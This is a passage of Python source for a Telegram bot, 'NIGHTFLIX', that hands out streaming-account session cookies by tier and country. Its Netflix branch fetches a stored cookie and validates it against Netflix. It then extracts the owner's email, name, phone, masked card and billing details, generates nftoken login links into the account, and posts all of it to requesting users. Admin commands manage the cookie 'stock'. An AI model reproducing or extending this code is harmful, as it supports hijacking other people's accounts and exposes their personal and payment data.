            "Examples: IN · US · BR · FR · DE · ID",
            parse_mode="HTML"
        )

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.chat.id not in ADMIN_IDS:
        return
    text = (
        "🛠 <b>ADMIN PANEL — STOCK MANAGER</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Tap a service to set its stock count.\n"
        "Current values shown in brackets."
    )
    bot.send_message(message.chat.id, text, reply_markup=admin_stock_markup(), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith(("netflix_", "prime_", "crunchyroll_", "spotify_")) and "_" in call.data)
def handle_country_service_selection(call):
    parts = call.data.split("_", 1)
    service = parts[0]
    country = parts[1].upper()
    chat_id = call.message.chat.id

    if chat_id not in USER_DATA:
        USER_DATA[chat_id] = {}
    USER_DATA[chat_id]["selected_country"] = country

    if service == "netflix":
        edit_current_message(call,
            f"🌍 <b>Country: {country}</b>\n\nChoose a tier below:",
            netflix_tier_markup_by_country(country)
        )
    else:
        edit_current_message(call, f"{service.title()} for {country} is coming soon.", main_menu_markup())

@bot.message_handler(func=lambda m: m.chat.id in ADMIN_IDS and m.chat.id in ADMIN_PENDING)
def admin_set_stock_value(message):
    chat_id = message.chat.id
    tier = ADMIN_PENDING.pop(chat_id, None)
    if not tier:
        return
    try:
        value = int(message.text.strip())
        if value < 0:
            raise ValueError
        STOCK[tier] = value
        bot.send_message(
            chat_id,
            f"✅ <b>Stock updated!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n<b>{tier.upper()}</b> → <code>{value}</code> accounts\n\nTap a service to update another.",
            reply_markup=admin_stock_markup(),
            parse_mode="HTML"
        )
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid number. Send a whole number like <code>150</code>.", parse_mode="HTML")
        ADMIN_PENDING[chat_id] = tier

# ====================== CALLBACKS ======================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    data = call.data

    # ── Answer immediately to prevent "query too old" error ──
    # (admin_toggle_ answers later with custom toast text instead)
    if not data.startswith("admin_toggle_"):
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    chat_id = call.message.chat.id
    user    = get_user_data(chat_id)
    lang    = user.get("lang", "en")

    if data == "main_menu":
        text, markup = build_home(chat_id, lang)
        edit_current_message(call, text, markup)

    elif data == "netflix":
        edit_current_message(call, languages.get_text(lang, "choose_netflix"), netflix_tier_markup(lang))

    elif data == "prime":
        edit_current_message(call, languages.get_text(lang, "choose_prime"), prime_tier_markup(lang))

    elif data == "crunchyroll":
        edit_current_message(call, "🔽 Choose a tier for <b>Crunchyroll</b>:", crunchyroll_markup(lang))

    elif data == "spotify":
        edit_current_message(call, "🔽 Choose a tier for <b>Spotify</b>:", spotify_markup(lang))

    elif data.startswith("admin_toggle_") and chat_id in ADMIN_IDS:
        service = data.replace("admin_toggle_", "")
        if service in SERVICE_VISIBILITY:
            SERVICE_VISIBILITY[service] = not SERVICE_VISIBILITY[service]
            push_visibility_to_db(service, SERVICE_VISIBILITY[service])  # ← save to DB
            state = "Enabled ✅" if SERVICE_VISIBILITY[service] else "Hidden ❌"
            try:
                bot.answer_callback_query(call.id, text=f"{service.title()} is now {state}")
            except Exception:
                pass
            edit_current_message(
                call,
                "🛠 <b>ADMIN PANEL — STOCK MANAGER</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\nTap a service to set its stock count.\nCurrent values shown in brackets.",
                admin_stock_markup()
            )

    elif data == "admin_sync_stock" and chat_id in ADMIN_IDS:
        sync_stock_from_db()
        bot.send_message(
            chat_id,
            f"✅ <b>Stock synced from DB!</b>\n\n🔥 Premium: <code>{STOCK['premium']}</code>\n⭐ Standard: <code>{STOCK['standard']}</code>\n🎯 Basic: <code>{STOCK['basic']}</code>",
            reply_markup=admin_stock_markup(),
            parse_mode="HTML"
        )

    elif data == "noop":
        pass

    elif data.startswith("tier_"):
        tier = data.split("_", 1)[1]
        emoji, service_name = get_service_info(tier)

        # ── Out of stock check ──
        if STOCK.get(tier, 0) <= 0:
            edit_current_message(call,
                f"❌ 😔 <b>{service_name} — NO LIVE COOKIES</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ <i>All cookies in this tier have expired.\nTry another tier or check back later.</i>",
                types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            )
            return

        # ── Hourly limit check ──
        if user["used"].get(tier, 0) >= 3:
            reset_at = (user.get("tier_reset") or {}).get(tier)
            now  = datetime.now()
            diff = (reset_at - now) if reset_at else timedelta(hours=1)
            m = int(diff.total_seconds() // 60)
            s = int(diff.total_seconds() % 60)
            limit_markup = types.InlineKeyboardMarkup()
            limit_markup.add(types.InlineKeyboardButton("📊 Status", callback_data="status"))
            limit_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call,
                f"⏳ ⏳ <b>LIMIT REACHED — {service_name}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ <b>STATUS:</b> <code>YOU'VE USED 3/3 COOKIES THIS HOUR.</code>\n"
                f"🕐 <b>COOLDOWN:</b> <code>RESETS IN: {m}M {s}S</code>\n\n"
                f"💡 <i>Hourly limits help protect our cookie database from abuse. Please try again later.</i>",
                limit_markup
            )
            return

        # ── Show verifying message ──
        edit_current_message(call,
            f"⏳ 🔍 <b>VERIFYING {service_name} COOKIE...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 <b>STATUS:</b> <code>CHECKING THAT THE SESSION IS STILL LIVE...</code>\n"
            f"⚡ <b>SERVICE:</b> <code>{service_name}</code>\n"
            f"⚙️ <b>METHOD:</b> <code>Automated Session Validation</code>\n\n"
            f"🕐 <i>Please wait while we establish a live connection...</i>"
        )
        time.sleep(0.3)

        # ── Increment usage ──
        user["used"][tier] = user["used"].get(tier, 0) + 1
        STOCK[tier] = max(0, STOCK[tier] - 1)
        if user["used"][tier] >= 3:
            user["tier_reset"][tier] = datetime.now() + timedelta(hours=1)

        used_now  = user["used"][tier]
        remaining = max(0, 3 - used_now)

        # ════════════════════════════════════════
        # ── NETFLIX TIERS (real DB + checker) ──
        # ════════════════════════════════════════
        if tier in ("premium", "standard", "basic"):
            import io, re

            # Step 1: Fetch from Supabase
            selected_country = USER_DATA.get(chat_id, {}).get("selected_country")
            cookie_row = fetch_cookie_from_db(tier, country=selected_country)
            # Clear after use
            if selected_country:
                USER_DATA[chat_id].pop("selected_country", None)
            if not cookie_row:
                edit_current_message(call, f"❌ 😔 <b>NETFLIX {tier.upper()} — NO LIVE COOKIES</b>...", types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")))
                user["used"][tier] = max(0, user["used"][tier] - 1)
                STOCK[tier] += 1
                return

            cookie_content = cookie_row["key_id"]
            public_id = cookie_row.get("public_id") or cookie_row.get("id") or cookie_row.get("key_id", "")[:12]
            service_type = cookie_row.get("service_type", "")
            db_country = cookie_row.get("country") or "N/A"

            parts = service_type.split()
            plan_label = tier.capitalize()
            country_db = parts[2] if len(parts) > 2 else db_country
            tier_label = tier.upper()

            # Step 2: Show VALIDATING card
            edit_current_message(call,
                f"🔍 🔍 <b>VALIDATING {tier_label} COOKIE...</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📡 <b>STATUS:</b> <code>CONNECTING TO NETFLIX SERVERS...</code>\n"
                f"⚡ <b>TIER:</b> <code>{tier_label}</code>\n"
                f"⚙️ <b>METHOD:</b> <code>Live Session Validation</code>\n\n"
                f"🕐 <i>Verifying cookie integrity, please wait...</i>"
            )

            cookie_dict = parse_cookie_dict(cookie_content)

            # Step 3: Run check + pull fields
            account_info = check_netflix_account(cookie_dict)
            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if not account_info and not country_db:
                edit_current_message(call, f"❌ 💀 <b>NETFLIX {tier_label} — COOKIE DEAD</b>...", types.InlineKeyboardMarkup().row(
                    types.InlineKeyboardButton(f"🔄 Try Again", callback_data=f"tier_{tier}"),
                    types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
                ))
                user["used"][tier] = max(0, user["used"][tier] - 1)
                STOCK[tier] += 1
                return

            # All field pulling (email, name_acc, days_left, language, nf_token, etc.)
            email          = account_info.get("email") or "N/A"
            name_acc       = account_info.get("accountOwnerName") or "N/A"
            country_real   = account_info.get("countryOfSignup") or country_db or "N/A"
            plan_real      = account_info.get("localizedPlanName") or f"Netflix {tier.capitalize()}"
            profiles       = account_info.get("profilesDisplay") or account_info.get("profileCount") or "N/A"
            quality        = account_info.get("videoQuality") or "N/A"
            streams_raw    = account_info.get("maxStreams") or "N/A"
            streams        = str(streams_raw).rstrip("}") if streams_raw != "N/A" else "N/A"
            next_bill      = account_info.get("nextBillingDate") or "N/A"
            payment        = account_info.get("paymentMethodType") or "N/A"
            member_since   = account_info.get("memberSince") or "N/A"
            profiles       = account_info.get("profilesDisplay") or "N/A"
            masked_card    = account_info.get("maskedCard") or "N/A"
            extra_member   = account_info.get("showExtraMemberSection") or "N/A"
            plan_price     = account_info.get("planPrice") or "N/A"
            phone          = account_info.get("phoneDisplay") or "N/A"
            email_verified = account_info.get("emailVerified") or "N/A"
            hold_status    = account_info.get("holdStatus") or "N/A"
            profile_count  = account_info.get("profileCount") or ""
            user_guid      = account_info.get("userGuid") or "N/A"

            member_since_display = member_since
            try:
                from checker import format_member_since as fmt_ms
                member_since_display = fmt_ms(member_since) if member_since != "N/A" else "N/A"
            except:
                pass

            days_left = "N/A"
            try:
                if next_bill and next_bill != "N/A":
                    from datetime import datetime as dt
                    delta = (dt.strptime(next_bill, "%Y-%m-%d").date() - dt.now().date()).days
                    days_left = f"{delta} days" if delta > 0 else "Expired"
            except:
                pass

            language = account_info.get("language") or account_info.get("preferredLanguage") or "N/A"

            nf_token_data, error = create_nftoken(cookie_dict, attempts=3)
            nf_token = nf_token_data.get("token") if nf_token_data else None

            watch_browser = f"https://netflix.com/?nftoken={nf_token}" if nf_token else None
            watch_mobile  = f"https://netflix.com/unsupported?nftoken={nf_token}" if nf_token else None
            watch_tv      = f"https://netflix.com/t/smarttv?nftoken={nf_token}" if nf_token else None

            plan_display = f"{plan_real} [{quality}] [Streams: {streams}]" if streams != "N/A" else plan_real
            profile_label = f"PROFILES ({profile_count})" if profile_count else "PROFILES"

            # Step 4: Show #NETFLIX ACCOUNT DETAILS header
            header_text = (
                f"<pre>"
                f"#{'=' * 50}\n"
                f"#NETFLIX ACCOUNT DETAILS\n"
                f"#SOFTWARE: NIGHTFLIX - Advanced Cookies module\n"
                f"#VERSION: V1.0.9\n"
                f"#BUILD BY: @caydigitals\n"
                f"#{'=' * 50}\n"
                f"#USERNAME         : {name_acc}\n"
                f"#EMAIL            : {email}\n"
                f"#PHONE            : {phone}\n"
                f"#EMAIL VERIFIED   : {email_verified}\n"
                f"#CREATED          : {member_since_display}\n"
                f"#COUNTRY          : {country_real}\n"
                f"#PLAN             : {plan_display}\n"
                f"#PAYMENT METHOD   : {payment}\n"
                f"#SOURCE           : Netflix\n"
                f"#EXPIRE           : {next_bill}\n"
                f"#DAYS LEFT        : {days_left}\n"
                f"#LANGUAGE         : {language}\n"
                f"#VIDEO QUALITY    : {quality}\n"
                f"#PLAN PRICE       : {plan_price}\n"
                f"#HOLD STATUS      : {hold_status}\n"
                f"#EXTRA MEMBERS    : {extra_member}\n"
                f"#CHECKED AT       : {now_str}\n"
                f"#{'=' * 50}\n\n"
                f"{cookie_content.strip()}"
                f"</pre>"
            )
            bot.send_message(chat_id, header_text, parse_mode="HTML")

            # Step 5: Long animation
            checking_msg = bot.send_message(chat_id, f"🔍 <b>Checking Cookie:</b> <code>[Parsing Cookie]</code> ⏳", parse_mode="HTML")
            time.sleep(0.3)
            bot.edit_message_text(chat_id=chat_id, message_id=checking_msg.message_id, text=f"🔑 <b>Checking Cookie:</b> <code>[Authenticating Session]</code> ⏳", parse_mode="HTML")
            time.sleep(0.3)
            bot.edit_message_text(chat_id=chat_id, message_id=checking_msg.message_id, text=f"⚙️ <b>Checking Cookie:</b> <code>[Calling Cay APIs]</code> ⏳", parse_mode="HTML")
            time.sleep(0.3)
            bot.edit_message_text(chat_id=chat_id, message_id=checking_msg.message_id, text=f"🔗 <b>Checking Cookie:</b> <code>[Building Watch Links]</code> ⏳", parse_mode="HTML")
            time.sleep(0.3)
            bot.delete_message(chat_id=chat_id, message_id=checking_msg.message_id)

            # Step 6: Show ✅ LIVE confirmation (this is what you wanted to keep)
            delivery_markup = types.InlineKeyboardMarkup()
            delivery_markup.add(types.InlineKeyboardButton(f"🔄 Get Another {tier_label}", callback_data=f"tier_{tier}"))
            delivery_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call,
                f"🎉 👑 <b>{tier_label} COOKIE — ✅ LIVE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{public_id}</code>\n"
                f"📊 <b>HOURLY LIMIT:</b> <code>{used_now} / 3</code>\n"
                f"🔒 <b>REMAINING SLOTS:</b> <code>{remaining} claims left</code>\n"
                f"⏱ <b>COOLDOWN PERIOD:</b> <code>1 hour rolling</code>\n\n"
                f"📤 <b>STATUS:</b> Session verified & active! Details below.",
                delivery_markup
            )

            # Step 7: Show ACCOUNT DETAILS + NFToken links
            detail_text = (
                f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📧 <b>EMAIL:</b> <code>{email}</code>\n"
                f"🌍 <b>COUNTRY:</b> <code>{country_real}</code>\n"
                f"📅 <b>MEMBER SINCE:</b> <code>{member_since_display}</code>\n"
                f"🎭 <b>{profile_label}:</b> <code>{profiles}</code>\n"
            )

            if nf_token:
                detail_text += (
                    f"\n🔑 ✅ <b>NFTOKEN WATCH LINKS:</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔗 <a href='{watch_browser}'>Watch in Browser</a>\n"
                    f"📱 <a href='{watch_mobile}'>Watch on Mobile</a>\n"
                    f"📺 <a href='{watch_tv}'>Watch on TV</a>\n"
                )
            else:
                detail_text += f"\n⚠️ <b>NFTOKEN:</b> <code>Could not generate — cookie may need re-check</code>"

            bot.send_message(chat_id, detail_text, parse_mode="HTML", disable_web_page_preview=True)

        # ════════════════════════════════════════
        # ── PRIME VIDEO ──
        # ════════════════════════════════════════
        elif tier == "prime":
            import io
            filename = get_prime_filename()
            delivery_markup = types.InlineKeyboardMarkup()
            delivery_markup.add(types.InlineKeyboardButton("🔄 Get Another Prime Video", callback_data="tier_prime"))
            delivery_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call,
                f"🎉 🍿 <b>PRIME VIDEO COOKIE — ✅ LIVE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{filename}</code>\n"
                f"📊 <b>HOURLY LIMIT:</b> <code>{used_now} / 3</code>\n"
                f"🔒 <b>REMAINING SLOTS:</b> <code>{remaining} claims left</code>\n"
                f"⏱ <b>COOLDOWN PERIOD:</b> <code>1 hour rolling</code>\n\n"
                f"📤 <b>STATUS:</b> Session verified & active! Cookies sent below.",
                delivery_markup
            )
            file_content = f"# Prime Video Cookie\n# File: {filename}\n# Generated: {datetime.now()}\n\nCOOKIE_PLACEHOLDER"
            file_bytes = io.BytesIO(file_content.encode())
            file_bytes.name = filename
            bot.send_document(chat_id, file_bytes,
                caption=f"🍿 <b>Prime Video Cookies</b>\n\n📁 <b>DATABASE ID:</b> <code>{filename}</code>",
                parse_mode="HTML"
            )
            retrieving_msg = bot.send_message(chat_id,
                f"🔍 <b>Retrieving details:</b> <code>[Connecting to Prime Video]</code> ⏳",
                parse_mode="HTML"
            )
            time.sleep(2)
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=retrieving_msg.message_id,
                text=(
                    f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👤 <b>USERNAME:</b> <code>N/A</code>\n"
                    f"🌍 <b>REGION:</b> <code>N/A</code>\n"
                    f"🟢 <b>STATUS:</b> <code>Active</code>"
                ),
                parse_mode="HTML"
            )

        # ════════════════════════════════════════
        # ── SPOTIFY ──
        # ════════════════════════════════════════
        elif tier == "spotify":
            import io, re
            filename = get_spotify_filename()
            username_match = re.search(r'\[([^\]]+@[^\]]+)\]', filename)
            username       = username_match.group(1).split("@")[0] if username_match else "N/A"
            spotify_tier_name = "Spotify Premium Family" if "Family" in filename else "Spotify Premium"
            delivery_markup = types.InlineKeyboardMarkup()
            delivery_markup.add(types.InlineKeyboardButton("🔄 Get Another Spotify", callback_data="tier_spotify"))
            delivery_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call,
                f"🎉 🎵 <b>SPOTIFY COOKIE — ✅ LIVE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{filename}</code>\n"
                f"📊 <b>HOURLY LIMIT:</b> <code>{used_now} / 3</code>\n"
                f"🔒 <b>REMAINING SLOTS:</b> <code>{remaining} claims left</code>\n"
                f"⏱ <b>COOLDOWN PERIOD:</b> <code>1 hour rolling</code>\n\n"
                f"📤 <b>STATUS:</b> Session verified & active! Cookies sent below.",
                delivery_markup
            )
            file_content = f"# Spotify Cookie\n# File: {filename}\n# Generated: {datetime.now()}\n\nCOOKIE_PLACEHOLDER"
            file_bytes = io.BytesIO(file_content.encode())
            file_bytes.name = filename
            bot.send_document(chat_id, file_bytes,
                caption=f"🎵 <b>Spotify Cookies</b>\n\n📁 <b>DATABASE ID:</b> <code>{filename}</code>",
                parse_mode="HTML"
            )
            retrieving_msg = bot.send_message(chat_id,
                f"🔍 <b>Retrieving details:</b> <code>[Connecting to Spotify]</code> ⏳",
                parse_mode="HTML"
            )
            time.sleep(2)
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=retrieving_msg.message_id,
                text=(
                    f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👤 <b>USERNAME:</b> <code>{username}</code>\n"
                    f"👑 <b>TIER:</b> <code>{spotify_tier_name}</code>\n"
                    f"🌍 <b>REGION:</b> <code>N/A</code>\n"
                    f"🟢 <b>STATUS:</b> <code>Active</code>"
                ),
                parse_mode="HTML"
            )

    elif data == "status":
        text, markup = build_status(chat_id, lang)
        edit_current_message(call, text, markup)

    elif data == "stock":
        text, markup = build_stock(lang)
        edit_current_message(call, text, markup)

    elif data == "help":
        text, markup = build_help(lang)
        edit_current_message(call, text, markup)

    elif data == "language":
        text, markup = build_lang(lang)
        edit_current_message(call, text, markup)

    elif data.startswith("lang_"):
        lang_code    = data.split("_", 1)[1]
        user["lang"] = lang_code
        lang         = lang_code
        lang_name    = languages.get_lang_name(lang)
        edit_current_message(call, f"✅ <b>Language set to {lang_name}</b>")
        time.sleep(0.8)
        text, markup = build_home(chat_id, lang)
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

    elif data.startswith("admin_set_") and chat_id in ADMIN_IDS:
        tier = data.replace("admin_set_", "")
        ADMIN_PENDING[chat_id] = tier
        bot.send_message(
            chat_id,
            f"✏️ <b>Set stock for <code>{tier.upper()}</code></b>\n\nCurrent value: <code>{STOCK.get(tier, 0)}</code>\nSend the new number now:",
            parse_mode="HTML"
        )

    elif data == "admin_reset_all" and chat_id in ADMIN_IDS:
        for key in STOCK:
            STOCK[key] = 0
        edit_current_message(call, "✅ <b>All stocks reset to 0.</b>", admin_stock_markup())

    elif data.startswith("by_country_"):
        service = data.replace("by_country_", "")
        # Remember which service user came from
        USER_DATA.setdefault(chat_id, {})["pending_country_service"] = service
        edit_current_message(call,
            f"🌍 <b>Get {service.title()} Cookies by Country</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Use: <code>/country IN</code>\n"
            f"Examples: IN • US • BR • FR • DE • ID\n\n"
            f"<i>Country will be applied to {service.title()} only.</i>",
            types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
            )
        )

    elif data.startswith("country_"):
        parts   = data.split("_", 2)
        service = parts[1]
        country = parts[2].upper()

        # Save country so tier handler uses it
        USER_DATA.setdefault(chat_id, {})["selected_country"] = country

        if service == "netflix":
            edit_current_message(call,
                f"🔽 <b>Choose a tier below:</b>",
                netflix_tier_markup_by_country(country)
            )
        elif service == "prime":
            edit_current_message(call,
                f"🔽 Choose a tier for <b>Prime Video ({country})</b>:",
                prime_tier_markup(lang)
            )
        elif service == "crunchyroll":
            edit_current_message(call,
                f"🔽 Choose a tier for <b>Crunchyroll ({country})</b>:",
                crunchyroll_markup(lang)
            )
        elif service == "spotify":
            edit_current_message(call,
                f"🔽 Choose a tier for <b>Spotify ({country})</b>:",
                spotify_markup(lang)
            )

# ====================== RUN ======================
if __name__ == "__main__":
    print("🚀 NIGHTFLIX Bot is running...")
    sync_stock_from_db()
    sync_visibility_from_db()
    
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook deleted")
    except Exception as e:
        print(f"⚠️ delete_webhook failed: {e} — continuing anyway")

    time.sleep(1)
    bot.set_my_commands([
        types.BotCommand("start",   "Open the main menu"),
        types.BotCommand("admin",   "Admin panel (owner only)"),
        types.BotCommand("status",  "Check your usage limits"),
        types.BotCommand("stock",   "View available cookie stock"),
        types.BotCommand("country", "Get cookies for a specific country"),
        types.BotCommand("lang",    "Change language / Cambiar idioma"),
    ])
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
